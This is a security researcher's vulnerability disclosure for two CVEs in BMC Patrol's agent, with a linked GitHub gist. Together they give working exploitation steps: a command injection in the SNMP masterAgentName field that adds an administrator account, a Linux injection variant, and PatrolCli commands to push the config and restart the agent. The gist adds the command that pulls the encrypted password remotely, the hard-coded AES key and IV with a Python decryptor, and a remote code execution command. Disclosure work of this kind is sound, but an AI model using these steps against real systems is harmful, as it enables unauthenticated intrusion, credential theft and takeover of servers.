=== Content from www.errno.fr_04188386_20250114_203420.html ===

# Vulnerabilities in BMC Patrol's agent remote configuration

## Guillaume Quéré

[GitHub](https://github.com/gquere)

[LinkedIn](https://www.linkedin.com/in/guillaume-qu%C3%A9r%C3%A9-90a6187b/)

[Root-Me](https://www.root-me.org/das)

* [CVE-2023-34258:Remote secrets leak using Patrol’s pconfig (<22.1.00)](#cve-2023-34258remote-secrets-leak-using-patrols-pconfig-22100)
* [CVE-2023-34257:Remote code excution using Patrol’s pconfig](#cve-2023-34257remote-code-excution-using-patrols-pconfig)
* [Editor response](#editor-response)
* [Timeline](#timeline)

Patrol’s [default configuration](https://docs.bmc.com/docs/PATROLAgent/107/securing-patrol-agent-from-the-pconfig-clients-655597337.html) permits unauthenticated remote configuration access and modification:
![config](/Patrol/config.png)

If your organisation uses this default setting, it should be changed ASAP as this makes the agent subject to two unauthenticated vulnerabilities resulting in remote code execution.

## CVE-2023-34258:Remote secrets leak using Patrol’s pconfig (<22.1.00)

The configuration is remotely queried using the `pconfig` binary. The configuration contains the encrypted password of the local Patrol user:
![get pass](/Patrol/get.png)

All Patrol instances before update 22.1.00 [use a default encryption key](https://gist.github.com/gquere/045638b9959f4b3e119ea01d8d6ff856).

Thus the password of the Patrol account can be decrypted:
![decrypt](/Patrol/decrypt.png)

A valid Patrol account can be used to authenticate to the service and remotely execute code:
![exec](/Patrol/exec.png)

This vulnerability is mitigated in versions >=22.1.00 since the encryption key has been diversified.

## CVE-2023-34257:Remote code excution using Patrol’s pconfig

The agent’s configuration can be remotely updated using the `pconfig` binary.

Remote code execution can be achieved by injecting commands in the masterAgentName field that is used to start the SNMP service.

For Windows:

```
"/snmp/masterAgentName" = { REPLACE = "cmd /c \"net user test_lol sup3rPASS! /add && net localgroup Administrators test_lol /add\" &&" },
"/snmp/masterAgentDir" = { REPLACE="bin/../../../Windows/system32/" },

```

Do note that the `masterAgentDir` path is relative and depends on Patrol’s installation path. Usually this is under C:\BMC.

On Linux systems (according to my old notes, YMMV) it’s a different parameter that leads to code execution:

```
"/snmp/masterAgentStartLine" = { REPLACE="/usr/bin/touch /tmp/snmp ; /usr/bin/touch /tmp/snmp2 & #" },

```

The configuration is pushed using the `+Reload` directive:

```
PatrolCli -host xxx +Reload /tmp/my_config

```

To maximize chances of success, only the new SNMP configuration should be pushed. Remotely overwriting other parts of the configuration may result in an **unrecoverable** remote DoS.

The agent needs to be remotely restarted for the modification to take effect:

```
PatrolCli -host xxx +RESTART

```
## Editor response

According to the editor these are not vulnerabilities: “These are not vulnerabilities for us as we have provided the option to implement the authentication”.

## Timeline

2021: Vulnerabilities discovered

2023-01: Editor contacted

2023-02: Editor ACK

2023-05: FD



=== Content from gist.github.com_29159899_20250114_203419.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fgquere%2F045638b9959f4b3e119ea01d8d6ff856)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fgquere%2F045638b9959f4b3e119ea01d8d6ff856&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fgquere%2F045638b9959f4b3e119ea01d8d6ff856) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fgquere%2F045638b9959f4b3e119ea01d8d6ff856&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@gquere](https://avatars.githubusercontent.com/u/1585000?s=64&v=4)](/gquere)

# [gquere](/gquere)/**[gist:045638b9959f4b3e119ea01d8d6ff856](/gquere/045638b9959f4b3e119ea01d8d6ff856)**

Last active
March 27, 2023 14:00

Show Gist options

* [Download ZIP](/gquere/045638b9959f4b3e119ea01d8d6ff856/archive/85c1730ca6cb0087e9ce811c193305941addb483.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fgquere%2F045638b9959f4b3e119ea01d8d6ff856)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fgquere%2F045638b9959f4b3e119ea01d8d6ff856)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/gquere/045638b9959f4b3e119ea01d8d6ff856.js&quot;&gt;&lt;/script&gt;
* Save gquere/045638b9959f4b3e119ea01d8d6ff856 to your computer and use it in GitHub Desktop.

[Code](/gquere/045638b9959f4b3e119ea01d8d6ff856)
[Revisions
4](/gquere/045638b9959f4b3e119ea01d8d6ff856/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/gquere/045638b9959f4b3e119ea01d8d6ff856.js&quot;&gt;&lt;/script&gt;

Save gquere/045638b9959f4b3e119ea01d8d6ff856 to your computer and use it in GitHub Desktop.

[Download ZIP](/gquere/045638b9959f4b3e119ea01d8d6ff856/archive/85c1730ca6cb0087e9ce811c193305941addb483.zip)

patrol password encryption

 [Raw](/gquere/045638b9959f4b3e119ea01d8d6ff856/raw/85c1730ca6cb0087e9ce811c193305941addb483/gistfile1.md)

[**gistfile1.md**](#file-gistfile1-md)

# Patrol unauthenticated get remote password

```
./pconfig +get -p <port> -host <host> | grep defaultAccount

```
# Patrol decrypt password

<https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0102030405060708414243444546474861626364656667689192939495969798'%7D,%7B'option':'Hex','string':'11213141516171810142639566470898'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)From_Base64('A-Za-z0-9%2B/%3D',true/disabled)To_Hex('Space',0/disabled)&input=RDIyMjZFOTRBMTg4NkY0MTc4NkFBQjk2MkQ0MUFBNTBGOUY1RUIwQ0EzQTJCMkYyMDFEQTMxNTJERDkxMTU2Ng>

```
#!/usr/bin/env python3
from Cryptodome.Cipher import AES
import base64
import sys

unpad = lambda s : s[0:-ord(s[-1:])]

key = b'\x01\x02\x03\x04\x05\x06\x07\x08\x41\x42\x43\x44\x45\x46\x47\x48\x61\x62\x63\x64\x65\x66\x67\x68\x91\x92\x93\x94\x95\x96\x97\x98'
iv = b'\x11\x21\x31\x41\x51\x61\x71\x81\x01\x42\x63\x95\x66\x47\x08\x98'

ct = bytearray.fromhex(sys.argv[1])

cipher = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher.decrypt(ct))

print(pt)
```

# Patrol code exec

```
./PatrolCli
PCli% user <user>
Password:
connect <hostname> <port>
execpsl "system(\"id\");"

```

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fgquere%2F045638b9959f4b3e119ea01d8d6ff856)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


